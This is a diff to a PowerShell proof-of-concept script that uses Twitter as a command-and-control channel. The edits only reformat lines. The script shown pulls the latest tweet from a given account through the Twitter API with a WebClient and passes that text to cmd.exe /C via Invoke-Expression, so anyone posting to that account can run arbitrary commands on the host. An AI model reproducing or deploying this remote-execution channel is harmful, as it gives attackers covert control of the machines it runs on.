@@ -9,7 +9,8 @@ This is PoC code to demonstrate how easy C2 is with PowerShell and Twitter
 $WebClientObject = New-Object System.Net.WebClient
             
 #Twitter API URL with username in it            
-[string] $TwitterAPIv1URL = "http://api.twitter.com/1/statuses/user_timeline.xml?screen_name=$TwitterUserName&count=1&page=1"
+[string] $TwitterAPIv1URL = `
+"http://api.twitter.com/1/statuses/user_timeline.xml?screen_name=$TwitterUserName&count=1&page=1"
             
 #Returns XML which PowerShell is great at parsing!
 [xml] $XMLTwitterResult = $WebClientObject.downloadString($TwitterAPIv1URL)
@@ -20,6 +21,5 @@ $WebClientObject.Dispose()
             
 #Build the command string and pass it to the invoke expression cmdlet
 [string] $Command = $LatestTweet
-[string] $CmdPath = "$env:windir\System32\cmd.exe"
-[string] $CmdString = "$CmdPath" + ' /C ' + "$Command"
+[string] $CmdString = "$env:windir\System32\cmd.exe" + ' /C ' + "$Command"
 Invoke-Expression $CmdString
